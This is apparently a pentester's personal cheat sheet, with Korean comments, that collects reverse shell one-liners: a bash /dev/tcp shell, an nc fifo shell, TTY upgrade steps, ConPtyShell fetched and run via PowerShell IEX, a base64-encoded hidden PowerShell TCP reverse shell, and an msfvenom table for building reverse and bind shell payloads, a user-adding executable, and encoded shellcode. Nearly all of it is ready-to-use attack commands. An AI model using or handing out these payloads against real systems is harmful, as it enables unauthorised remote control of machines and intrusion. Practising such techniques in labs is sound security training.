---
sticker: lucide//command
---
### Bourne Shell one-liner
```sh
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

### Bash Shell one-liner
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 9001 >/tmp/f
```

### Reverse Shell → Interactive upgrade
```bash
activemq@broker:/opt/apache-activemq-5.15.15/bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<bin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
activemq@broker:/opt/apache-activemq-5.15.15/bin$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg   

activemq@broker:/opt/apache-activemq-5.15.15/bin$ export TERM=xterm
```
(※ ^z 이후 bg 를 하면 background 에서 다시 돌아간다. 이는 터널링 작업을 할 때 유용함)

### conPtyShell
Fully-Interactive Shell 로 리버스쉘을 만들 때 사용 가능
https://github.com/antonioCoco/ConPtyShell
```powershell
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```
혹은 공격자 서버에 Invoke-ConPtyShell.ps1 을 받아서 실행
```powershell
IEX(IWR https://<ATTACKER_ADDRESS>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```

이후 공격자에게서 실행
```bash
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

cmd 에서 실행하려면,
```cmd
powershell -ExecutionPolicy Bypass -NoProfile -Command "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 10.0.0.2 3001"
```

### PowerShell one-liner
**powershell**
```powershell
kali@kali:~$ pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA


PS> exit

```

**python**
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

### msfvenom cheatsheet

| MSFVenom Payload Generation One-Liner                                                                                                                                                                                   | Description                                     |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------- |
| msfvenom -l payloads                                                                                                                                                                                                    | List available payloads                         |
| msfvenom -p PAYLOAD --list-options                                                                                                                                                                                      | List payload options                            |
| msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP                                                                                                                                                       | Payload Encoding                                |
| msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                                                    | Linux Meterpreter reverse shell x86 multi stage |
| msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                                                       | Linux Meterpreter bind shell x86 multi stage    |
| msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                                                             | Linux bind shell x64 single stage               |
| msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf                                                                                                                                          | Linux reverse shell x64 single stage            |
| msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe                                                                                                                                      | Windows Meterpreter reverse shell               |
| msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe | Windows Meterpreter http reverse shell          |
| msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe                                                                                                                                        | Windows Meterpreter bind shell                  |
| msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe                                                                                                                                            | Windows CMD Multi Stage                         |
| msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe                                                                                                                                        | Windows CMD Single Stage                        |
| msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe                                                                                                                                              | Windows add user                                |
| msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho > shell.macho                                                                                                                                        | Mac Reverse Shell                               |
| msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho > shell.macho                                                                                                                                           | Mac Bind shell                                  |
| msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw > shell.py                                                                                                                                               | Python Shell                                    |
| msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh                                                                                                                                                 | BASH Shell                                      |
| msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw > shell.pl                                                                                                                                                 | PERL Shell                                      |
| msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp                                                                                                                                      | ASP Meterpreter shell                           |
| msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp                                                                                                                                           | JSP Shell                                       |
| msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war                                                                                                                                           | WAR Shell                                       |
| msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php cat shell.php                                                                                                                            | pbcopy && echo '?php '                          |
| msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php                                                                                                                                            | Php Reverse Shell                               |
| msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('[http://IP/nishang.ps1')\](http://ip/nishang.ps1'\)%5C)"" -f python                                  | Windows Exec Nishang Powershell in python       |
| msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x04\xA0"                                                                                                     | Bad characters shikata_ga_nai                   |
| msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b "\x04\xA0"                                                                                                        | Bad characters fnstenv_mov                      |
